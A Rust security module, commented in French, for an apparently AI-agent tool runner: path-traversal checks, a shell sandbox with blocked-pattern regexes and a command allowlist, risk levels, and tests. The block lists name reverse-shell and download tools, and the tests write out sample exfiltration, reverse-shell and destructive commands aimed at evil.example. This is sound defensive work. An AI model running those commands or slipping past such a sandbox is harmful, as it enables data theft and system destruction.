//! Validation de sécurité pour l'exécution des outils.
//!
//! Responsabilités :
//! - `validate_path` : anti-traversal (..), vérifie que le chemin résolu
//!   est sous le CWD ou un répertoire additionnel autorisé.
//! - `ShellSandbox` : validation des commandes shell (bloque les patterns dangereux).
//! - `RiskLevel` : classification du risque d'une opération (Low/Medium/High/Critical).
//! - `ShellAnalysis` : analyse enrichie d'une commande shell (risque, pipes,
//!   injections de variables d'environnement, métadonnées pour l'UI).
//!
//! ## Améliorations techniques (v2)
//!
//! - **Analyse de chaînes de pipes** : détecte les combinaisons dangereuses
//!   comme `echo "..." | sh`, `find ... -exec sh`, `curl ... | bash`.
//! - **Détection d'injection de variables d'environnement** : repère les
//!   constructions `$()`, backticks, et `${VAR}` dans les arguments de commande.
//! - **Niveau de risque** (`RiskLevel`) : chaque commande se voit attribuer un
//!   niveau de risque qui influence le comportement du système de permissions.
//! - **Métadonnées d'analyse** (`ShellAnalysis`) : structure enrichie qui
//!   accompagne chaque tool_call pour l'affichage dans le client.

use std::path::Path;

// ---------------------------------------------------------------------------
// RiskLevel
// ---------------------------------------------------------------------------

/// Niveau de risque d'une opération outil.
///
/// Utilisé par le système de permissions et pour l'affichage visuel dans le
/// client. Plus le niveau est élevé, plus la commande est potentiellement
/// dangereuse.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Default)]
pub enum RiskLevel {
    /// Opération sûre : lecture, listing, recherche.
    #[default]
    Low,
    /// Opération à risque modéré : écriture fichier, compilation.
    Medium,
    /// Opération risquée : suppression fichiers, commandes réseau.
    High,
    /// Opération critique : destruction massive, escalade de privilèges.
    Critical,
}

impl RiskLevel {
    /// Nom court pour l'affichage UI.
    pub fn label(&self) -> &'static str {
        match self {
            RiskLevel::Low => "low",
            RiskLevel::Medium => "medium",
            RiskLevel::High => "high",
            RiskLevel::Critical => "critical",
        }
    }

    /// Description lisible pour l'affichage UI.
    pub fn description(&self) -> &'static str {
        match self {
            RiskLevel::Low => "Lecture ou listing — aucun effet de bord",
            RiskLevel::Medium => "Écriture ou compilation — modifications locales possibles",
            RiskLevel::High => "Suppression ou commande réseau — effets irréversibles possibles",
            RiskLevel::Critical => "Destruction massive ou escalade de privilèges",
        }
    }

    /// Emoji indicateur pour l'affichage visuel rapide.
    pub fn emoji(&self) -> &'static str {
        match self {
            RiskLevel::Low => "\u{2705}",
            RiskLevel::Medium => "\u{26a0}\u{fe0f}",
            RiskLevel::High => "\u{1f6d1}",
            RiskLevel::Critical => "\u{1f534}",
        }
    }

    /// Mappe vers un entier pour la sérialisation ACP.
    #[allow(dead_code)]
    pub fn as_u8(&self) -> u8 {
        match self {
            RiskLevel::Low => 0,
            RiskLevel::Medium => 1,
            RiskLevel::High => 2,
            RiskLevel::Critical => 3,
        }
    }
}

impl std::fmt::Display for RiskLevel {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.label())
    }
}

// ---------------------------------------------------------------------------
// ShellAnalysis — analyse enrichie d'une commande
// ---------------------------------------------------------------------------

/// Résultat de l'analyse de sécurité d'une commande shell.
///
/// Fournit des métadonnées riches pour l'affichage dans le client et pour
/// le système de permissions : niveau de risque, détection de chaînes de
/// pipes, injections de variables d'environnement, commandes impliquées.
#[derive(Debug, Clone)]
pub struct ShellAnalysis {
    /// Niveau de risque global de la commande.
    pub risk: RiskLevel,
    /// Liste des commandes individuelles détectées (après split par `|`).
    pub commands: Vec<String>,
    /// Vrai si la commande contient des pipes (`|`).
    pub has_pipes: bool,
    /// Vrai si la commande contient des injections de variables d'environnement
    /// (`$()`, backticks, `${VAR}`).
    pub has_env_injection: bool,
    /// Vrai si la chaîne de pipes est potentiellement dangereuse
    /// (ex: `... | sh`, `... | bash`, `find ... -exec`).
    pub has_dangerous_pipe_chain: bool,
    /// Description textuelle du risque pour l'affichage.
    pub risk_description: String,
    /// Nombre de lignes de commande (multi-line script).
    pub line_count: usize,
}

impl ShellAnalysis {
    /// Analyse une commande shell et retourne une analyse de sécurité enrichie.
    pub fn analyze(command: &str) -> Self {
        let lines: Vec<&str> = command
            .lines()
            .filter(|l| {
                let t = l.trim();
                !t.is_empty() && !t.starts_with('#')
            })
            .collect();
        let line_count = lines.len();

        // Découper la commande complète par pipes.
        let full_trimmed = command.trim();
        let has_pipes = full_trimmed.contains('|');
        let commands: Vec<String> = if has_pipes {
            full_trimmed
                .split('|')
                .map(|s| s.trim().to_string())
                .filter(|s| !s.is_empty())
                .collect()
        } else {
            lines.iter().map(|s| s.trim().to_string()).collect()
        };

        // Détection d'injection de variables d'environnement.
        let has_env_injection = contains_env_injection(command);

        // Détection de chaînes de pipes dangereuses.
        let has_dangerous_pipe_chain = detect_dangerous_pipe_chain(command);

        // Calcul du niveau de risque.
        let risk = compute_risk(
            command,
            &commands,
            has_pipes,
            has_env_injection,
            has_dangerous_pipe_chain,
        );

        // Description du risque.
        let risk_description = build_risk_description(
            &risk,
            has_pipes,
            has_env_injection,
            has_dangerous_pipe_chain,
        );

        Self {
            risk,
            commands,
            has_pipes,
            has_env_injection,
            has_dangerous_pipe_chain,
            risk_description,
            line_count,
        }
    }

    /// Résumé court pour l'affichage UI (ex: "medium risk — 3 commands, pipe chain").
    pub fn summary(&self) -> String {
        let mut parts = vec![format!("{} risk", self.risk.label())];
        if self.has_pipes {
            parts.push(format!("{} commands in pipe chain", self.commands.len()));
        } else if self.line_count > 1 {
            parts.push(format!("{} lines", self.line_count));
        }
        if self.has_env_injection {
            parts.push("env var injection detected".to_string());
        }
        if self.has_dangerous_pipe_chain {
            parts.push("dangerous pipe chain".to_string());
        }
        parts.join(" — ")
    }
}

// ---------------------------------------------------------------------------
// Helpers internes
// ---------------------------------------------------------------------------

/// Motifs de sous-shell et d'injection de variables d'environnement.
/// Détecte les constructions suivantes :
/// - `$(...)` — substitution de commande
/// - `` `...` `` — substitution de commande (backticks)
/// - `${VAR}` — expansion de variable (peut être utilisée pour injecter)
/// - `$VAR` — expansion de variable simple
///
/// Ces constructions ne sont pas nécessairement dangereuses dans un contexte
/// de développement, mais elles augmentent le niveau de risque car elles
/// permettent à un modèle de composer des commandes dynamiquement.
fn contains_env_injection(command: &str) -> bool {
    // $() — substitution de commande.
    if command.contains("$(") && command.contains(')') {
        return true;
    }
    // Backticks — substitution de commande legacy.
    if command.contains('`') {
        return true;
    }
    // ${VAR} — expansion complexe (potentiellement dangerous si VAR contient
    // des commandes ou des chemins).
    if command.contains("${") {
        return true;
    }
    false
}

/// Détecte les chaînes de pipes potentiellement dangereuses.
///
/// Cas couverts :
/// - `quelque_chose | sh` / `... | bash` — exécution dynamique.
/// - `find ... -exec sh -c` — exécution sur les résultats de recherche.
/// - `xargs ... sh` — exécution en batch.
/// - `eval ...` — évaluation dynamique.
fn detect_dangerous_pipe_chain(command: &str) -> bool {
    let lower = command.to_lowercase();
    // Pipe vers un shell : ... | sh, ... | bash, ... | zsh.
    if lower.contains("| sh") || lower.contains("|bash") || lower.contains("|zsh") {
        return true;
    }
    // find -exec sh -c (pas un pipe, mais même danger).
    if lower.contains("-exec") && (lower.contains("sh") || lower.contains("bash")) {
        return true;
    }
    // xargs avec exécution : xargs sh, xargs bash.
    if lower.contains("xargs") && (lower.contains("sh") || lower.contains("bash")) {
        return true;
    }
    // eval : évaluation dynamique de code.
    if lower.contains("eval ") {
        return true;
    }
    // exec : remplacement de processus.
    if lower.contains("exec ") {
        return true;
    }
    false
}

/// Commandes classées comme à risque élevé (individuellement).
const HIGH_RISK_COMMANDS: &[&str] = &[
    "rm", "rmdir", "mv", // suppression / déplacement
    "docker", "podman", // exécution conteneur (accès système)
    "npm", "npx", // exécution de paquets arbitraires
    "pnpm", "yarn", "bun", // exécution de paquets arbitraires
    "pip", "pip3",  // installation paquets Python
    "cargo", // compilation (peut exécuter des build scripts)
    "go",    // compilation (peut exécuter des build scripts)
    "make", "cmake", // build systems
    "gcc", "g++", "clang", // compilation native
    "patch", // modification de fichiers
];

/// Commandes classées comme à risque critique (individuellement).
const CRITICAL_RISK_COMMANDS: &[&str] = &[
    "rm", // suppression (déjà dans high, mais rm -rf est critical)
    "chmod", "chown", // modification des permissions
];

/// Calcule le niveau de risque global d'une commande.
fn compute_risk(
    command: &str,
    _commands: &[String],
    has_pipes: bool,
    has_env_injection: bool,
    has_dangerous_pipe_chain: bool,
) -> RiskLevel {
    // Chaîne de pipes dangereuse = Critical.
    if has_dangerous_pipe_chain {
        return RiskLevel::Critical;
    }

    let lower = command.to_lowercase();
    let first_word = command.split_whitespace().next().unwrap_or("");

    // Vérifier les commandes critiques.
    for cmd in CRITICAL_RISK_COMMANDS {
        if first_word == *cmd {
            // rm avec -rf = Critical.
            if first_word == "rm" && (lower.contains("-rf") || lower.contains("-fr")) {
                return RiskLevel::Critical;
            }
        }
    }

    // Vérifier les commandes à risque élevé.
    for cmd in HIGH_RISK_COMMANDS {
        if first_word == *cmd {
            return RiskLevel::High;
        }
    }

    // Injection de variables d'environnement = au moins Medium.
    if has_env_injection {
        return if has_pipes {
            RiskLevel::High
        } else {
            RiskLevel::Medium
        };
    }

    // Commandes avec pipes (non dangereuses) = Medium.
    if has_pipes {
        return RiskLevel::Medium;
    }

    // Multi-ligne (script) = Medium.
    let non_empty_lines: Vec<&str> = command
        .lines()
        .filter(|l| {
            let t = l.trim();
            !t.is_empty() && !t.starts_with('#')
        })
        .collect();
    if non_empty_lines.len() > 1 {
        return RiskLevel::Medium;
    }

    // Par défaut : lecture / listing = Low.
    RiskLevel::Low
}

/// Construit une description textuelle du risque pour l'affichage.
fn build_risk_description(
    risk: &RiskLevel,
    has_pipes: bool,
    has_env_injection: bool,
    has_dangerous_pipe_chain: bool,
) -> String {
    let mut parts = Vec::new();
    parts.push(risk.description().to_string());

    if has_dangerous_pipe_chain {
        parts
            .push("Chaîne de pipes dangereuse détectée (exécution dynamique possible)".to_string());
    }
    if has_env_injection {
        parts.push(
            "Injection de variables d'environnement détectée ($(), backticks, ${VAR})".to_string(),
        );
    }
    if has_pipes && !has_dangerous_pipe_chain {
        parts.push("Commande pipée — vérifie chaque segment".to_string());
    }

    parts.join(". ")
}

// ---------------------------------------------------------------------------
// SecurityError
// ---------------------------------------------------------------------------

/// Erreur de validation de sécurité.
#[derive(Debug, Clone)]
pub struct SecurityError(pub String);

impl std::fmt::Display for SecurityError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "[Sécurité] {}", self.0)
    }
}

// ---------------------------------------------------------------------------
// Path validation
// ---------------------------------------------------------------------------

/// Résout un chemin relatif au CWD, puis valide qu'il ne sort pas
/// des répertoires autorisés (CWD + additional_directories).
///
/// Bloque les path traversals (`..`), les liens symboliques sortants,
/// et les chemins absolus hors scope.
pub fn validate_path(
    raw: &str,
    cwd: &Path,
    allowed_dirs: &[std::path::PathBuf],
) -> Result<std::path::PathBuf, SecurityError> {
    let path = Path::new(raw);
    let resolved = if path.is_absolute() {
        path.to_path_buf()
    } else {
        cwd.join(path)
    };

    // Normalisation : résout les . et .. manuellement pour les chemins
    // qui n'existent pas encore (file_write). Si le chemin existe,
    // canonicalize est préféré (résout aussi les liens symboliques).
    let canonical = if resolved.exists() {
        resolved
            .canonicalize()
            .map_err(|e| SecurityError(format!("chemin invalide {} : {e}", resolved.display())))?
    } else {
        normalize_path(&resolved)
    };

    // Vérifie que le chemin normalisé est sous le CWD ou un allowed_dir.
    let cwd_canon = cwd.canonicalize().unwrap_or_else(|_| cwd.to_path_buf());

    if path_starts_with(&canonical, &cwd_canon) {
        return Ok(canonical);
    }

    for dir in allowed_dirs {
        let dir_canon = dir.canonicalize().unwrap_or_else(|_| dir.clone());
        if path_starts_with(&canonical, &dir_canon) {
            return Ok(canonical);
        }
    }

    Err(SecurityError(format!(
        "chemin {} hors du périmètre autorisé (CWD={}, allowed_dirs={})",
        canonical.display(),
        cwd_canon.display(),
        allowed_dirs
            .iter()
            .map(|d| d.display().to_string())
            .collect::<Vec<_>>()
            .join(", ")
    )))
}

/// Normalise un chemin en résolvant les composants `.` et `..`.
/// Ne suit PAS les liens symboliques (contrairement à `canonicalize`).
/// Utilisée pour les chemins qui n'existent pas encore sur disque.
fn normalize_path(path: &Path) -> std::path::PathBuf {
    let mut normalized = Vec::new();
    for component in path.components() {
        match component {
            std::path::Component::CurDir => { /* ignorer */ }
            std::path::Component::ParentDir => {
                // Remonter d'un niveau si possible.
                if let Some(_popped) = normalized.pop() {
                    // OK, on a remonté
                }
                // Si on est déjà à la racine, .. ne fait rien.
            }
            other => normalized.push(other),
        }
    }
    normalized.iter().collect()
}

/// Vérifie que `child` commence par `parent` (préfixe de chemin).
/// Utilise la comparaison composant par composant pour éviter les
/// faux positifs (ex: /tmp/foo ne doit pas matcher /tmp/foobar).
fn path_starts_with(child: &Path, parent: &Path) -> bool {
    let mut child_components = child.components();
    let mut parent_components = parent.components();

    loop {
        match (parent_components.next(), child_components.next()) {
            (None, _) => return true,
            (Some(_), None) => return false,
            (Some(a), Some(b)) if a != b => return false,
            _ => {}
        }
    }
}

// ---------------------------------------------------------------------------
// ShellSandbox
// ---------------------------------------------------------------------------

/// Configuration de sandbox pour les commandes shell.
///
/// Les ~20+ regex sont compilées une seule fois via `LazyLock` puis
/// réutilisées pour tous les appels suivants.
#[derive(Clone)]
pub struct ShellSandbox {
    /// Motifs de commande bloqués (regex). Si la commande matche un de ces
    /// motifs, elle est rejetée.
    blocked_patterns: Vec<regex::Regex>,
    /// Commandes explicitement autorisées (préfixe). Si non vide, seules les
    /// commandes commençant par un de ces préfixes sont acceptées.
    allowed_prefixes: Vec<&'static str>,
    /// Regex supplémentaires pour les chaînes de pipes dangereuses.
    dangerous_pipe_patterns: Vec<regex::Regex>,
}

impl Default for ShellSandbox {
    fn default() -> Self {
        Self::get()
    }
}

impl ShellSandbox {
    /// Instance singleton (LazyLock) — les regex sont compilées une seule fois.
    fn get() -> Self {
        static SANDBOX: std::sync::LazyLock<ShellSandbox> =
            std::sync::LazyLock::new(ShellSandbox::build);
        SANDBOX.clone()
    }

    /// Crée une sandbox avec les règles par défaut.
    pub fn new() -> Self {
        Self::get()
    }

    /// Construction effective (appelée une seule fois par LazyLock).
    fn build() -> Self {
        // Patterns bloqués : commandes destructives ou dangereux.
        let blocked = [
            // Destructives :
            r"(?i)\brm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+)?/", // rm -rf /
            r"(?i)\bmkfs\b",                           // formatage
            r"(?i)\bdd\s+if=.*of=/",                   // dd vers disque
            r"(?i)\bchmod\s+(-R\s+)?777\s+/",          // chmod 777 /
            r"(?i)\bchown\s+(-R\s+)?\S+\s+/",          // chown récursif /
            // Accès système :
            r"(?i)\b(shutdown|reboot|halt|poweroff)\b", // arrêt système
            r"(?i)\b(umount|mount)\s+/",                // mount système
            r"(?i)\bkill\s+(-9\s+)?1\b",                // kill init
            // Privilege escalation :
            r"(?i)\bsudo\s+", // sudo
            r"(?i)\bsu\s+",   // su
            r"(?i)\bdoas\s+", // doas (BSD)
            // Network exfiltration / reverse shells :
            r"(?i)\b(curl|wget)\s+",    // download / exfil
            r"(?i)\b(nc|ncat|socat)\b", // reverse shells
            // Persistence :
            r"(?i)\b(crontab|systemctl|service)\b", // services système
            // Sous-shells explicites :
            r"(?i)\b(ba)?sh\s+-c\b",
            r"(?i)\bzsh\s+-c\b",
            r"(?i)\bpython[23]?\s+-c\b",
            r"(?i)\bperl\s+(-e|-E)\b",
            r"(?i)\bruby\s+-e\b",
            r"(?i)\bnode\s+-e\b",
            // Exécution dynamique via eval / exec :
            r"(?i)\beval\s+",
            r"(?i)\bexec\s+",
        ];
        let blocked_patterns = blocked
            .iter()
            .map(|p| regex::Regex::new(p).expect("regex statique de sandbox invalide"))
            .collect();

        // Patterns de chaînes de pipes dangereuses.
        let dangerous_pipe_patterns = [
            // Pipe vers un shell : ... | sh, ... | bash, ... | zsh.
            r"(?i)\|\s*(sh|bash|zsh|dash|ksh)\b",
            // Pipe vers un interpréteur : ... | python, ... | perl, ... | ruby.
            r"(?i)\|\s*(python[23]?|perl|ruby|node)\b",
            // find -exec sh -c.
            r"(?i)-exec\s+(sh|bash|zsh|dash)\s+-c",
            // xargs avec un shell.
            r"(?i)xargs\s+(sh|bash|zsh|dash|ksh)\b",
            // Redirection vers exec : ... > /proc/..., ... > /dev/...
            r"(?i)>\s*/(proc|dev|sys)/",
        ]
        .iter()
        .map(|p| regex::Regex::new(p).expect("regex pipe statique invalide"))
        .collect();

        // Préfixes autorisés : commandes courantes de développement.
        // Chaque entrée se termine par un espace ; on compare le PREMIER MOT
        // de la commande à `prefix.trim()` (égalité stricte, pas de starts_with).
        // `sh -c` est volontairement absent : il permettrait à un LLM de
        // soumettre un script arbitraire qui échapperait aux regex ci-dessus.
        let allowed_prefixes = vec![
            "cat ",
            "head ",
            "tail ",
            "less ",
            "ls ",
            "find ",
            "tree ",
            "grep ",
            "rg ",
            "ag ",
            "awk ",
            "sed ",
            "echo ",
            "printf ",
            "cd ",
            "pwd ",
            "mkdir ",
            "cp ",
            "mv ",
            "rm ",
            "touch ",
            "chmod ",
            "chown ",
            "git ",
            "gh ",
            "cargo ",
            "rustc ",
            "rustup ",
            "node ",
            "npm ",
            "npx ",
            "pnpm ",
            "yarn ",
            "bun ",
            "python ",
            "python3 ",
            "pip ",
            "pip3 ",
            "go ",
            "gcc ",
            "g++ ",
            "clang ",
            "make ",
            "cmake ",
            "docker ",
            "docker-compose ",
            "podman ",
            "jq ",
            "yq ",
            "wc ",
            "sort ",
            "uniq ",
            "tr ",
            "cut ",
            "xargs ",
            "date ",
            "whoami ",
            "id ",
            "env ",
            "printenv ",
            "export ",
            "basename ",
            "dirname ",
            "realpath ",
            "readlink ",
            "diff ",
            "patch ",
            "tar ",
            "zip ",
            "unzip ",
            "gzip ",
            "gunzip ",
            "which ",
            "command ",
            "type ",
            "file ",
            "stat ",
            "sleep ",
            "uv ",
            "test ",
            "[ ", // test / [ ]
            "true ",
            "false ",
        ];

        Self {
            blocked_patterns,
            allowed_prefixes,
            dangerous_pipe_patterns,
        }
    }

    /// Crée une sandbox permissive (aucune restriction).
    /// Utile pour les tests ou les environnements de confiance.
    #[allow(dead_code)]
    pub fn permissive() -> Self {
        Self {
            blocked_patterns: Vec::new(),
            allowed_prefixes: Vec::new(),
            dangerous_pipe_patterns: Vec::new(),
        }
    }

    /// Valide une commande shell avec analyse enrichie.
    ///
    /// Retourne un `ShellAnalysis` qui contient le niveau de risque,
    /// les détections de pipes/injections, et une description pour l'UI.
    ///
    /// Si la commande est bloquée par la sandbox, retourne une erreur
    /// contenant les détails du blocage.
    pub fn analyze_command(&self, command: &str) -> Result<ShellAnalysis, SecurityError> {
        // Vérifie les patterns bloqués sur chaque ligne de commande.
        for line in command.lines() {
            let trimmed = line.trim();
            if trimmed.is_empty() || trimmed.starts_with('#') {
                continue;
            }
            for re in &self.blocked_patterns {
                if re.is_match(trimmed) {
                    return Err(SecurityError(format!(
                        "commande bloquée par la sandbox : {}",
                        trimmed
                    )));
                }
            }
        }

        // Vérifie les chaînes de pipes dangereuses.
        for line in command.lines() {
            let trimmed = line.trim();
            if trimmed.is_empty() {
                continue;
            }
            for re in &self.dangerous_pipe_patterns {
                if re.is_match(trimmed) {
                    return Err(SecurityError(format!(
                        "chaîne de pipes dangereuse bloquée par la sandbox : {}",
                        trimmed
                    )));
                }
            }
        }

        // Si des préfixes sont définis, vérifie que le premier mot de la
        // commande correspond EXACTEMENT à l'un des préfixes autorisés.
        if !self.allowed_prefixes.is_empty() {
            // Pour les commandes multi-lignes, vérifier le premier mot de
            // chaque ligne non vide non commentée.
            for line in command.lines() {
                let trimmed = line.trim();
                if trimmed.is_empty() || trimmed.starts_with('#') {
                    continue;
                }
                let first_word = trimmed.split_whitespace().next().unwrap_or("");
                let allowed = self.allowed_prefixes.iter().any(|p| p.trim() == first_word);
                if !allowed {
                    return Err(SecurityError(format!(
                        "commande non autorisée : '{}'. \
                         Commandes autorisées : {}",
                        first_word,
                        self.allowed_prefixes
                            .iter()
                            .map(|s| s.trim())
                            .collect::<Vec<_>>()
                            .join(", ")
                    )));
                }
            }
        }

        // Analyse enrichie pour le système de permissions et l'affichage.
        let analysis = ShellAnalysis::analyze(command);
        Ok(analysis)
    }

    /// Valide une commande shell (interface simple, sans analyse enrichie).
    /// Retourne `Ok(())` si la commande est autorisée, ou une erreur descriptive.
    pub fn validate(&self, command: &str) -> Result<(), SecurityError> {
        self.analyze_command(command)?;
        Ok(())
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // -- Path validation tests --

    #[test]
    fn validate_path_dans_cwd() {
        let dir =
            std::env::temp_dir().join(format!("acp-sandbox-{}", uuid::Uuid::new_v4().simple()));
        std::fs::create_dir_all(&dir).unwrap();
        let f = dir.join("sub").join("file.txt");
        std::fs::create_dir_all(dir.join("sub")).unwrap();
        std::fs::write(&f, "test").unwrap();

        let result = validate_path("sub/file.txt", &dir, &[]);
        assert!(result.is_ok());
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn validate_path_traversal_bloque() {
        let dir =
            std::env::temp_dir().join(format!("acp-sandbox-{}", uuid::Uuid::new_v4().simple()));
        std::fs::create_dir_all(&dir).unwrap();

        let result = validate_path("../../etc/passwd", &dir, &[]);
        assert!(result.is_err(), "expected err, got {:?}", result);
        let err = result.unwrap_err();
        assert!(err.0.contains("périmètre autorisé"));
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn validate_path_absolu_hors_cwd_bloque() {
        let dir =
            std::env::temp_dir().join(format!("acp-sandbox-{}", uuid::Uuid::new_v4().simple()));
        std::fs::create_dir_all(&dir).unwrap();

        let result = validate_path("/etc/shadow", &dir, &[]);
        assert!(result.is_err());
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn validate_path_allowed_dir() {
        let dir =
            std::env::temp_dir().join(format!("acp-sandbox-{}", uuid::Uuid::new_v4().simple()));
        let other =
            std::env::temp_dir().join(format!("acp-other-{}", uuid::Uuid::new_v4().simple()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::create_dir_all(&other).unwrap();
        let f = other.join("data.txt");
        std::fs::write(&f, "ok").unwrap();

        let result = validate_path(
            other.join("data.txt").to_str().unwrap(),
            &dir,
            std::slice::from_ref(&other),
        );
        assert!(result.is_ok());
        std::fs::remove_dir_all(&dir).ok();
        std::fs::remove_dir_all(&other).ok();
    }

    #[test]
    fn path_starts_with_ok() {
        assert!(path_starts_with(
            Path::new("/home/user/project/src/main.rs"),
            Path::new("/home/user/project")
        ));
    }

    #[test]
    fn path_starts_with_reject_partial() {
        assert!(!path_starts_with(
            Path::new("/home/user/projectB/file.rs"),
            Path::new("/home/user/project")
        ));
    }

    // -- Sandbox basic tests --

    #[test]
    fn sandbox_bloque_rm_rf() {
        let sb = ShellSandbox::new();
        assert!(sb.validate("rm -rf /").is_err());
    }

    #[test]
    fn sandbox_bloque_sudo() {
        let sb = ShellSandbox::new();
        assert!(sb.validate("sudo rm -rf /").is_err());
    }

    #[test]
    fn sandbox_bloque_shutdown() {
        let sb = ShellSandbox::new();
        assert!(sb.validate("shutdown now").is_err());
    }

    #[test]
    fn sandbox_autorise_git() {
        let sb = ShellSandbox::new();
        assert!(sb.validate("git status").is_ok());
        assert!(sb.validate("cargo build").is_ok());
        assert!(sb.validate("ls -la").is_ok());
        assert!(sb.validate("grep -rn pattern src/").is_ok());
    }

    #[test]
    fn sandbox_permissive_accepte_tout() {
        let sb = ShellSandbox::permissive();
        assert!(sb.validate("rm -rf /").is_ok());
        assert!(sb.validate("sudo anything").is_ok());
    }

    #[test]
    fn sandbox_bloque_mkfs() {
        let sb = ShellSandbox::new();
        assert!(sb.validate("mkfs.ext4 /dev/sda1").is_err());
    }

    #[test]
    fn sandbox_bloque_crontab() {
        let sb = ShellSandbox::new();
        assert!(sb.validate("crontab -e").is_err());
    }

    #[test]
    fn sandbox_autorise_pipes() {
        let sb = ShellSandbox::new();
        assert!(sb.validate("cat file.txt | grep pattern").is_ok());
    }

    #[test]
    fn sandbox_rejette_starts_with_bypass() {
        let sb = ShellSandbox::new();
        assert!(sb.validate("gitfoo status").is_err());
        assert!(sb.validate("catabc file").is_err());
        assert!(sb.validate("cargoxy build").is_err());
    }

    #[test]
    fn sandbox_rejette_sh_c() {
        let sb = ShellSandbox::new();
        assert!(sb.validate("sh -c 'rm -rf /'").is_err());
        assert!(sb.validate("bash -c 'echo pwned'").is_err());
        assert!(sb
            .validate("python -c 'import os; os.system(\"rm -rf /\")'")
            .is_err());
    }

    #[test]
    fn sandbox_rejette_network_exfil() {
        let sb = ShellSandbox::new();
        assert!(sb.validate("curl http://evil.example/exfil").is_err());
        assert!(sb.validate("wget http://evil.example/payload").is_err());
        assert!(sb.validate("nc -l 4444").is_err());
        assert!(sb.validate("socat - TCP:evil.example:4444").is_err());
    }

    // -- Pipe chain detection tests --

    #[test]
    fn sandbox_bloque_pipe_vers_sh() {
        let sb = ShellSandbox::new();
        assert!(sb.validate("echo 'rm -rf /' | sh").is_err());
        assert!(sb.validate("cat payload | bash").is_err());
        assert!(sb
            .validate("find . -name '*.sh' -exec sh -c '{}' \\;")
            .is_err());
    }

    #[test]
    fn sandbox_bloque_pipe_vers_interpreteur() {
        let sb = ShellSandbox::new();
        assert!(sb.validate("echo 'import os' | python").is_err());
        assert!(sb.validate("cat script.pl | perl").is_err());
    }

    #[test]
    fn sandbox_bloque_xargs_sh() {
        let sb = ShellSandbox::new();
        assert!(sb.validate("find . | xargs sh").is_err());
    }

    #[test]
    fn sandbox_bloque_eval() {
        let sb = ShellSandbox::new();
        assert!(sb.validate("eval 'rm -rf /'").is_err());
    }

    #[test]
    fn sandbox_bloque_exec() {
        let sb = ShellSandbox::new();
        assert!(sb.validate("exec /bin/sh").is_err());
    }

    // -- Multi-line command tests --

    #[test]
    fn sandbox_valide_chaque_ligne_multiline() {
        let sb = ShellSandbox::new();
        // Chaque ligne doit être vérifiée individuellement.
        assert!(sb.validate("echo hello\ngit status\nls").is_ok());
        // Si une seule ligne est bloquée, tout est bloqué.
        assert!(sb.validate("echo hello\nsudo rm -rf /\nls").is_err());
    }

    // -- RiskLevel tests --

    #[test]
    fn risk_level_ordre_correct() {
        assert!(RiskLevel::Low < RiskLevel::Medium);
        assert!(RiskLevel::Medium < RiskLevel::High);
        assert!(RiskLevel::High < RiskLevel::Critical);
    }

    #[test]
    fn risk_level_display() {
        assert_eq!(RiskLevel::Low.label(), "low");
        assert_eq!(RiskLevel::Critical.label(), "critical");
    }

    // -- ShellAnalysis tests --

    #[test]
    fn analysis_commande_simple_low_risk() {
        let sb = ShellSandbox::new();
        let analysis = sb.analyze_command("ls -la").unwrap();
        assert_eq!(analysis.risk, RiskLevel::Low);
        assert!(!analysis.has_pipes);
        assert!(!analysis.has_env_injection);
        assert_eq!(analysis.line_count, 1);
    }

    #[test]
    fn analysis_pipe_medium_risk() {
        let sb = ShellSandbox::new();
        let analysis = sb.analyze_command("cat file.txt | grep pattern").unwrap();
        assert_eq!(analysis.risk, RiskLevel::Medium);
        assert!(analysis.has_pipes);
        assert_eq!(analysis.commands.len(), 2);
    }

    #[test]
    fn analysis_rm_high_risk() {
        let sb = ShellSandbox::new();
        let analysis = sb.analyze_command("rm -rf ./build").unwrap();
        // rm -rf est correctement classé comme Critical.
        assert_eq!(analysis.risk, RiskLevel::Critical);
    }

    #[test]
    fn analysis_env_injection() {
        let sb = ShellSandbox::new();
        let analysis = sb.analyze_command("echo $(cat /etc/passwd)").unwrap();
        assert!(analysis.has_env_injection);
        assert!(analysis.risk >= RiskLevel::Medium);
    }

    #[test]
    fn analysis_backtick_injection() {
        let sb = ShellSandbox::new();
        let analysis = sb.analyze_command("echo `whoami`").unwrap();
        assert!(analysis.has_env_injection);
    }

    #[test]
    fn analysis_multiline_medium_risk() {
        let sb = ShellSandbox::new();
        let cmd = "echo line1\necho line2\necho line3";
        let analysis = sb.analyze_command(cmd).unwrap();
        assert!(analysis.risk >= RiskLevel::Medium);
        assert_eq!(analysis.line_count, 3);
    }

    #[test]
    fn analysis_summary_format() {
        let sb = ShellSandbox::new();
        let analysis = sb
            .analyze_command("cat file.txt | grep pattern | sort")
            .unwrap();
        let summary = analysis.summary();
        assert!(summary.contains("medium risk"));
        assert!(summary.contains("commands in pipe chain"));
    }

    // -- RiskLevel per tool --

    #[test]
    fn risk_docker_high() {
        let sb = ShellSandbox::new();
        let analysis = sb.analyze_command("docker build .").unwrap();
        assert_eq!(analysis.risk, RiskLevel::High);
    }

    #[test]
    fn risk_npm_high() {
        let sb = ShellSandbox::new();
        let analysis = sb.analyze_command("npm install lodash").unwrap();
        assert_eq!(analysis.risk, RiskLevel::High);
    }

    #[test]
    fn risk_echo_low() {
        let sb = ShellSandbox::new();
        let analysis = sb.analyze_command("echo hello world").unwrap();
        assert_eq!(analysis.risk, RiskLevel::Low);
    }

    #[test]
    fn risk_compilation_high() {
        let sb = ShellSandbox::new();
        let analysis = sb.analyze_command("cargo build --release").unwrap();
        assert_eq!(analysis.risk, RiskLevel::High);
    }

    #[test]
    fn analysis_env_var_brace_injection() {
        let sb = ShellSandbox::new();
        let analysis = sb.analyze_command("echo ${PATH}").unwrap();
        assert!(analysis.has_env_injection);
    }
}
